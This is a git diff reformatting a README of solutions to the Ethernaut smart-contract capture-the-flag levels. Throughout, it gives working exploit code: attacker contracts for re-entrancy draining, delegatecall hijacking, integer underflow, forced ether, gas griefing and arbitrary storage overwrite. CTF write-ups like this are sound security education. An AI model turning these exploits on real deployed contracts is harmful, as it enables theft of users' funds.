@@ -1,7 +1,7 @@
 # ethernaut-ctf-solutions
 
-<details>
-    <summary>🍂 Level 1 - Fallback</summary>
+
+## 🍂 Level 1 - Fallback
 
 ```javascript
 // first need to send some ether to contribute():
@@ -20,11 +20,9 @@ await contract.withdraw()
 await getBalance(instance)
 ```
 
-</details>
 
- <details>
-    <summary>💣 Level 2 - Fallout</summary>
-    
+## 💣 Level 2 - Fallout
+
 ```javascript
  /* constructor */
   function Fal1out() public payable    // <--- typo makes it not actually a constructor
@@ -33,10 +31,8 @@ await getBalance(instance)
 await contract.Fal1out()
 ```
 
-</details> 
 
- <details>
-    <summary>🛹 Level 3 - Coin flip</summary>
+## 🛹 Level 3 - Coin flip
 
 Deploy this guesser contract, using e.g. Remix IDE:
 
@@ -69,10 +65,8 @@ contract CoinFlipGuess {
 
 Then repeatedly invoke the guess() function, calls will only go through when we know they will succeed in the `CoinFlip` contract.
 
-</details> 
 
- <details>
-    <summary>☎️ Level 4 - Telephone</summary>
+## ☎️ Level 4 - Telephone
 
 Deploy this and call `ring_ring()`, we just need a smart contract to act as a buffer so that `msg.sender != tx.origin`. See also [rekt - THORChain](https://rekt.news/thorchain-rekt2/)
 
@@ -87,44 +81,38 @@ interface Telephone {
 
 contract CallMeMaybe {
     Telephone instance = Telephone(address(...));
-    
+
     function ring_ring() public {
         instance.changeOwner(msg.sender);
     }
 }
 ```
 
-</details> 
 
- <details>
-    <summary>💸 Level 5 - Token</summary>
-    
+## 💸 Level 5 - Token
+
 ```javascript
 // trigger an underflow by transferring >20 tokens to any address
 await contract.transfer("0xd4F3ae2100b186D5e8e0E41d7930bE7B3a3e9E6C", 100)
 ```
 
-</details> 
 
- <details>
-    <summary>👉 Level 6 - Delegation</summary>
-    
+## 👉 Level 6 - Delegation
+
 ```javascript
 // we want to hit the fallback function of the delegator, and pass it the selector of the pwn() function so that it invokes pwn() on the delegate
 
 contract.sendTransaction({
-    to: instance, 
+    to: instance,
     data: web3.eth.abi.encodeFunctionSignature("pwn()")
 })
 
 ```
 
-</details> 
 
- <details>
-    <summary>🏋️‍♂️ Level 7 - Force</summary>
+## 🏋️‍♂️ Level 7 - Force
 
-Relevant chapter in [Mastering Ethereum](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc#unexpected-ether)
+Relevant chapter in [Mastering Ethereum](https://github.com/ethereumbook/ethereumbook/blob/develop/09smart-contracts-security.asciidoc##unexpected-ether)
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -132,17 +120,15 @@ pragma solidity ^0.6.0;
 
 contract TakeMyMoney {
     fallback() external payable {}
-    
+
     function boom(address payable _address) public {
         selfdestruct(_address);
     }
 }
 ```
 
-</details> 
 
- <details>
-    <summary>🏦 Level 8 - Vault</summary>
+## 🏦 Level 8 - Vault
 
 Find the transaction that was used to create the contract on Etherscan, and look in the state change tab. We can see the value that was stored in the first variable: that's the password, then we just invoke unlock with it:
 
@@ -150,10 +136,8 @@ Find the transaction that was used to create the contract on Etherscan, and look
 await contract.unlock("0x...")
 ```
 
-</details> 
 
- <details>
-    <summary>👑 Level 9 - King</summary>
+## 👑 Level 9 - King
 
 Trying to make this contract the king, it should refuse eth transfers, hence preventing the ownership transfer. Deploy it with 1 ETH, so that it has a starting balance.
 
@@ -168,25 +152,23 @@ interface King {
 
 contract KingMaker {
     constructor() public payable {}
-    
+
     function kingMe(address kingInstance) public {
         // send ether using a low-level call because send/transfer are limited to 2300 gas
       // send exactly 1 ether, because we need to pass the condition but not exceed the balance of the King contract
         kingInstance.call{value:1 ether}("");
         require(King(kingInstance)._king() == address(this));
     }
-    
+
     function withdraw() public {
         payable(msg.sender).transfer(address(this).balance);
     }
 }
 ```
 
-</details> 
 
 
- <details>
-    <summary>🔁 Level 10 - Re-entrancy</summary>
+## 🔁 Level 10 - Re-entrancy
 
 ```solidity
 // SPDX-License-Identifier: GPL-3.0
@@ -201,32 +183,28 @@ interface Reentrance {
 contract Withdrawer {
     Reentrance instance = Reentrance(address(...));
     uint amount = 0.1 ether;
-    
+
     constructor() payable {}
-    
+
     // this is where we trigger the re-entrancy bug
     receive() external payable {
         if (address(instance).balance >= amount)  {
             instance.withdraw(amount);
         }
     }
-    
+
     function pullTheTrigger() public {
         instance.donate{value: amount}(address(this));
         instance.withdraw(amount);
     }
-    
+
     function drain() public {
         payable(msg.sender).transfer(address(this).balance);
     }
 }
 ```
 
-</details> 
-
-
-<details>
-    <summary>☝️ Level 11 - Elevator</summary>
+## ☝️ Level 11 - Elevator
 
 ```solidity
 // SPDX-License-Identifier: GPL-3.0
@@ -239,27 +217,25 @@ interface Elevator {
 
 contract Building {
     Elevator instance = Elevator(address(...));
-    
+
     bool answer = true;
-    
+
   function isLastFloor(uint) external returns (bool) {
       answer = !answer;
       return answer;
   }
- 
+
   function justDoIt() public {
       instance.goTo(42);
   }
 }
 ```
 
-</details> 
 
-<details>
-    <summary>🤫 Level 12 - Privacy</summary>
+## 🤫 Level 12 - Privacy
 
 ```javascript
-// read where data[2] is stored (in the fifth slot since there is some 
+// read where data[2] is stored (in the fifth slot since there is some
 packing of smaller arguments going on):
 
 await web3.eth.getStorageAt(instance, 5)
@@ -272,10 +248,8 @@ await contract.unlock('0x658df6fba159ec7a1e678c38c33e7a77')
 
 ```
 
-</details> 
 
-<details>
-    <summary>💂‍♂️ Level 13 - Gatekeeper one</summary>
+## 💂‍♂️ Level 13 - Gatekeeper one
 
 For the key value itself, need to replace the last 2 bytes with the end of the address used to send the transaction.
 
@@ -308,7 +282,7 @@ contract Enterer {
         }
         return false;
     }
-    
+
     function drain() public {
         payable(msg.sender).transfer(address(this).balance);
     }
@@ -316,17 +290,15 @@ contract Enterer {
 
 ```
 
-</details> 
 
-<details>
-    <summary>🐕 Level 14 - Gatekeeper two</summary>
+## 🐕 Level 14 - Gatekeeper two
 
 ```solidity
 // SPDX-License-Identifier: MIT
 
-// this is important, with newer Solidity versions, 
+// this is important, with newer Solidity versions,
 // `uint64(0) - 1` will fail because it relies on an underflow
-pragma solidity ^0.6.0; 
+pragma solidity ^0.6.0;
 
 interface GatekeeperTwo {
   function enter(bytes8 _gateKey) external returns(bool);
@@ -337,13 +309,13 @@ contract Enterer {
         uint64 hashedMe = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
         uint64 key = ~hashedMe;
         uint64 expected = uint64(0) - 1;
-        
+
         require(hashedMe ^ key == expected, "wrong key");
-        
+
         GatekeeperTwo instance = GatekeeperTwo(address(...));
         instance.enter(bytes8(key));
     }
-    
+
     function drain() public {
         payable(msg.sender).transfer(address(this).balance);
     }
@@ -351,10 +323,8 @@ contract Enterer {
 
 ```
 
-</details> 
 
-<details>
-    <summary>👌 Level 15 - Naught coin</summary>
+## 👌 Level 15 - Naught coin
 
 The timelock only applies to `transfer`, not `transferFrom` so we need to go with `approve` -> `transferFrom`
 
@@ -369,10 +339,8 @@ The timelock only applies to `transfer`, not `transferFrom` so we need to go wit
 "0"
 ```
 
-</details> 
 
-<details>
-    <summary>⏰ Level 16 - Preservation</summary>
+## ⏰ Level 16 - Preservation
 
 Deploy this first:
 
@@ -405,10 +373,8 @@ await contract.setFirstTime(evildoer);
 await contract.setFirstTime(42);
 ```
 
-</details> 
 
-<details>
-    <summary>⛑️ Level 17 - Recovery</summary>
+## ⛑️ Level 17 - Recovery
 Use etherscan to find the address the 0.5 ether was sent to.
 
 ```javascript
@@ -432,10 +398,8 @@ web3.eth.abi.encodeFunctionCall({
 web3.eth.sendTransaction({from: player, to: tokenContract, data: "0x00f55d9d000000000000000000000000...."})
 ```
 
-</details> 
 
-<details>
-    <summary>🧙‍♂️ Level 18 - Magic number</summary>
+## 🧙‍♂️ Level 18 - Magic number
 
 Let's make the tiniest solver in Yul:
 
@@ -485,10 +449,10 @@ Text representation:
   return
 ```
 
-Take note of the binary representation. We want to deploy that, which is a bit tricky because we need to send a transaction to address 0 not with this code directly, but with code that returns this binary representation. I took the opportunity to learn about deployment code by writing a [raw_deployer](https://github.com/karmacoma-eth/yolo-evm#raw_deployerpy) script:
+Take note of the binary representation. We want to deploy that, which is a bit tricky because we need to send a transaction to address 0 not with this code directly, but with code that returns this binary representation. I took the opportunity to learn about deployment code by writing a [raw_deployer](https://github.com/karmacoma-eth/yolo-evm##raw_deployerpy) script:
 
 ``` shell
-> python raw_deployer.py 602a60205260206020f3       
+> python raw_deployer.py 602a60205260206020f3
 600a8061000d6000396000f3fe602a60205260206020f3
 ```
 
@@ -496,8 +460,8 @@ Now we got the init code, we can create the contract:
 
 ```javascript
 web3.eth.sendTransaction({
-    from: player, 
-/* no to address as we are creating a contract */ 
+    from: player,
+/* no to address as we are creating a contract */
     data: "600a8061000d6000396000f3fe602a60205260206020f3"
 })
 ```
@@ -508,13 +472,9 @@ Now just set the solver on the contract and we're done:
 await contract.setSolver('0x...')
 ```
 
-</details> 
+## 👽 Level 19 - Alien codex
 
-
-<details>
-    <summary>👽 Level 19 - Alien codex</summary>
-
-Relevant [Solidity docs](https://docs.soliditylang.org/en/v0.8.5/internals/layout_in_storage.html#mappings-and-dynamic-arrays):
+Relevant [Solidity docs](https://docs.soliditylang.org/en/v0.8.5/internals/layout_in_storage.html##mappings-and-dynamic-arrays):
 
 >>> "Assume the storage location of the mapping or array ends up being a slot p after applying the storage layout rules. ... Array data is located starting at keccak256(p) and it is laid out in the same way as statically-sized array data would: One element after the other, potentially sharing storage slots if the elements are not longer than 16 bytes."
 
@@ -536,10 +496,10 @@ contract Underhanded {
 
     function pullTheTrigger() public {
         instance.make_contact();
-        
+
         // we need to underflow the length of the array, which is now 0xffffffff....
         instance.retract();
-        
+
         // now we get to modify any storage we want
         // the base storage of the array is at 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
         // so to overwrite storage at slot 0, we calculate the index as hex(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 1)
@@ -548,7 +508,7 @@ contract Underhanded {
             0x0000000000000000000000008830c393b2ed864Bb3c1A2FB9Fce8dA83f6db66c
         );
     }
-    
+
     function drain() public {
         payable(msg.sender).transfer(address(this).balance);
     }
@@ -556,10 +516,8 @@ contract Underhanded {
 
 ```
 
-</details> 
 
-<details>
-    <summary>🙅‍♂️ Level 20 - Daniel</summary>
+## 🙅‍♂️ Level 20 - Daniel
 Just burn all the gas available in the receive() function since they didn't specify a gas stipend like `call.gas(100000).value()`
 
 ```solidity
@@ -575,17 +533,15 @@ contract Burner {
             i++;
         }
     }
-    
+
     function drain() public {
         payable(msg.sender).transfer(address(this).balance);
     }
 }
 ```
 
-</details> 
 
-<details>
-    <summary>🛍️ Level 21 - Shop</summary>
+## 🛍️ Level 21 - Shop
 Idea: use the fact the Shop sets `sold = true` between the two calls: they paid for a storage change, and maybe we can look it up for cheap. However even with the following Solidity code I wasn't able to get it to run under the 3000 gas limit:
 
 ```solidity
@@ -604,7 +560,7 @@ contract Buyer {
     function price() external view returns (uint) {
         return shop.isSold{gas: 2000}() ? 42 : 200;
     }
-    
+
     function pullTheTrigger() public {
         shop.buy();
     }
@@ -692,13 +648,11 @@ await contract.isSold()
 -> true
 
 (await contract.price()).toString()
--> 42 
+-> 42
 ```
 
-</details> 
 
-<details>
-    <summary>⚖️ Level 22 - Dex</summary>
+## ⚖️ Level 22 - Dex
 
 Really anticlimactic final challenge, just keep swapping back and forth. The contract doesn't calculate the number of outgoing tokens properly, so it's losing liquidity every time 🤷‍♂️
-</details> 
+
